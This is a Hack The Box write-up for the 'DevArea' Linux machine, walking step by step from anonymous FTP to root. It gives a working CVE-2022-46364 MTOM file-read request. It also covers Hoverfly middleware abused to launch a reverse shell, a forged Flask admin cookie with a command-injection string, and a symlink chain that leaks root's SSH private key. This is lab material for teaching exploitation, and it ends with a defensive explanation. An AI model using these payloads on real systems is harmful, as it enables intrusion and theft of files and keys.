# DevArea — Hack The Box, Medium, Linux

**TL;DR:** Anonymous FTP hands you the application jar — an Apache **CXF 3.2.14**
SOAP service that echoes its input. CXF 3.2.14 is vulnerable to **CVE-2022-46364**:
an MTOM `xop:Include href="file://…"` makes the server read a local file and echo it
back, giving arbitrary file read. The systemd units leak the **Hoverfly** admin
password on a command line; Hoverfly's *middleware* feature is command execution, for
a shell as `dev_ryan`. `dev_ryan` can `sudo` a "SysWatch" bash CLI; its Flask GUI has
a command injection reachable by **forging an admin session with a world-readable
secret key**, giving `syswatch`. Finally the same CLI's `logs` command reads a file as
root but validates only the **first** symlink hop — a symlink chain leaks root's SSH
private key.

## 1. Recon

```
21/tcp   vsftpd 3.0.5   (anonymous allowed)
22/tcp   OpenSSH 9.6p1
80/tcp   Apache 2.4.58  → redirects to devarea.htb
8080/tcp Jetty 9.4.27
8500/tcp "This is a proxy server"  ┐ Hoverfly proxy + admin
8888/tcp Hoverfly Dashboard        ┘
```

Anonymous FTP holds one file: `pub/employee-service.jar`.

## 2. The jar → arbitrary file read (CVE-2022-46364)

Decompiling (CFR) shows an Apache CXF JAX-WS service started at
`http://0.0.0.0:8080/employeeservice`, one operation `submitReport(Report)` that
echoes the fields:

```java
factory.setServiceClass(EmployeeService.class);
factory.setAddress("http://0.0.0.0:8080/employeeservice");
// submitReport(...) returns "Report received from " + report.getEmployeeName() + ...
```

`META-INF/maven/org.apache.cxf/*/pom.properties` pins **CXF 3.2.14** with the aegis
databinding. A classic `<!DOCTYPE>` XXE is refused (Woodstox: *"Received event DTD"*),
but CXF's MTOM layer is a separate door — **CVE-2022-46364**. Send a multipart MTOM
message whose echoed field is an `xop:Include`; CXF fetches the `href` and the service
echoes the file back (base64):

```
POST /employeeservice
Content-Type: multipart/related; type="application/xop+xml"; boundary="MIME_boundary"; start-info="text/xml"

--MIME_boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope …><soapenv:Body><dev:submitReport><arg0>
  <confidential>false</confidential><content>x</content><department>IT</department>
  <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>
</arg0></dev:submitReport></soapenv:Body></soapenv:Envelope>
--MIME_boundary--
```

`→ "Report received from <base64 of /etc/passwd>. Department: IT…"`. Users: `root`,
`dev_ryan`, and a service account `syswatch`.

## 3. File-read → Hoverfly creds → shell as dev_ryan

The service runs as `dev_ryan` with `InaccessiblePaths=…/user.txt`, so read the
systemd units instead:

```
/etc/systemd/system/hoverfly.service
  ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

Hoverfly (v1.11.3) runs a local **middleware** binary for each proxied request —
arbitrary code execution once authenticated:

```
POST /api/token-auth {admin/O7IJ27MyyXiU}            → JWT
PUT  /api/v2/hoverfly/middleware
     {"binary":"/bin/bash","script":"#!/bin/bash\n<bg reverse shell> &\ncat"}
# trigger through the authenticated proxy:
curl -x http://admin:O7IJ27MyyXiU@target:8500 http://devarea.htb/
```

Hoverfly *validates* the middleware by running it, so the script must return valid
JSON — background the reverse shell and `cat` stdin through. Shell as `dev_ryan` →
`user.txt`.

## 4. dev_ryan → syswatch (forged Flask session + command injection)

```
sudo -l →  (root) NOPASSWD: /opt/syswatch/syswatch.sh, !…web-stop, !…web-restart
```

`syswatch-v1.zip` in the home unpacks the SysWatch project. Its Flask GUI
(`app.py`, `127.0.0.1:7777`, running as `syswatch`) has:

```python
res = subprocess.run([f"systemctl status --no-pager {service}"], shell=True, …)
SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")   # still allows $() | space -
```

Login is required, but `/etc/syswatch.env` is world-readable and holds
`SYSWATCH_SECRET_KEY` — forge an admin cookie:

```
flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin'}" --secret <SECRET_KEY>
```

The injection can't contain `/` or `.`; build the path at runtime (`$(pwd|head -c1)`
= `/`) and reference a `/tmp` reverse-shell file:

```
service=$(bash $(pwd|head -c1)tmp$(pwd|head -c1)rsh)
```

The web process runs it → shell as `syswatch`.

## 5. syswatch → root (chained-symlink read of root's SSH key)

`sudo /opt/syswatch/syswatch.sh logs <name>` reads `/opt/syswatch/logs/<name>` as
**root**. Its symlink guard reads only the immediate target and rejects it if it
contains `/`, but it never canonicalises the chain and `cat` follows all of it. A
two-link chain defeats it (syswatch owns the logs directory):

```bash
ln -sf /root/.ssh/id_ed25519  /opt/syswatch/logs/y   # hop 2: absolute (never inspected)
ln -sf y                      /opt/syswatch/logs/x   # hop 1: relative → passes the check
# as dev_ryan:
sudo /opt/syswatch/syswatch.sh logs x                # prints root's private key
```

```
ssh -i id_ed25519 root@devarea → root.txt
```

## 6. Why it works
Every step is a validation that trusts the wrong thing: a patched XML parser next to
an unpatched attachment layer (CVE-2022-46364); a password on a command line; a
world-readable signing key; a blacklist that forgets `$()`; and a symlink check that
inspects one hop while `cat` walks the whole chain. The last is the highest-severity
bug — resolve the canonical path and confine it before reading.

## Leads that didn't pan out
- Inline `<!DOCTYPE>` XXE against the SOAP endpoint — refused by Woodstox; the MTOM
  attachment path is the way in.
- The SysWatch monitoring plugins run as root and write into the syswatch-owned log
  dir, tempting a symlink write-race against their `log_message` (which has a
  rm+recreate guard). It's workable but fragile — the `logs` chained-symlink *read*
  is the clean, instant path.
